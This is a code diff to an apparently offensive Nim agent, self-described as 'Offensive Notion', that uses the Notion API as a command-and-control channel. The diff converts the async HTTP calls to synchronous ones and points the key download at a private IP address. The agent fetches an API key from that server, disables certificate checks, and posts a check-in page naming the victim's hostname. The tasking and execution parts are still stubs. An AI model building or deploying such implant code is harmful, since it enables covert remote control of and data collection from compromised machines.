@@ -1,6 +1,6 @@
 import std/[
     json,
-    asyncdispatch,
+    # asyncdispatch,
     strformat, 
     terminal,
     net
@@ -23,7 +23,7 @@ import httpcore
 ]#
 
 const URL_BASE = "https://api.notion.com/v1"
-const API_KEY_URL = "http://localhost:8888/api.txt"
+const API_KEY_URL = "http://172.23.8.114:8888/api.txt"
 
 proc getConfigOptions(): (string, string) =
     #[  
@@ -40,7 +40,7 @@ proc getConfigOptions(): (string, string) =
 
 
 # Create Agent Check-in Page
-proc createPage(headers: array[3, (string, string)], configs: tuple): Future[string] {.async.} =
+proc createPage(headers: array[3, (string, string)], configs: tuple): string =
     let hostname = getHostname()
     let url = fmt"{URL_BASE}/pages/"
     # let proxy = newProxy("http://localhost:8080")
@@ -65,23 +65,22 @@ proc createPage(headers: array[3, (string, string)], configs: tuple): Future[str
     # echo bodyString
     # Craft JSON request
     let headers = newHttpHeaders(headers)
-    let client = newAsyncHttpClient(
+    let client = newHttpClient(
       headers=headers, 
       # proxy=proxy, 
       sslContext=newContext(verifyMode=CVerifyNone)
     )
-    let res = await client.request(url, httpMethod = HttpPost, body = bodyString)
+    let res = client.request(url, httpMethod = HttpPost, body = bodyString)
     if res.status == Http200:
-      let page = await res.body
+      let page = res.body
       return parseJson(page)["id"].getStr()
     echo res.status
-    echo await res.body
     return ""
 
-proc getApiKey(url: string): Future[string] {.async.} =
-    let client = newAsyncHttpClient()
-    let r = await client.get(url)
-    result = await r.body
+proc getApiKey(url: string): string =
+    let client = newHttpClient()
+    let r = client.get(url)
+    result = r.body
 
 # Get new blocks*
 
@@ -90,10 +89,10 @@ proc getApiKey(url: string): Future[string] {.async.} =
 # Do em*
 
 
-proc main() {.async.} =
+proc main() =
     echo "[*] Offensive Notion! Because Reasons!"
 
-    let NOTION_API_KEY: string = await getApiKey(API_KEY_URL)
+    let NOTION_API_KEY: string = getApiKey(API_KEY_URL)
 
     if NOTION_API_KEY != "":
         echo "GOT THE API KEY"
@@ -104,9 +103,9 @@ proc main() {.async.} =
         "Content-Type": "application/json",
         "Authorization":  &"Bearer {NOTION_API_KEY}"
     }
-    let pageId = await createPage(headers, configs)
+    let pageId = createPage(headers, configs)
     echo pageId
 
 
 when isMainModule:
-    waitfor main()
+    main()
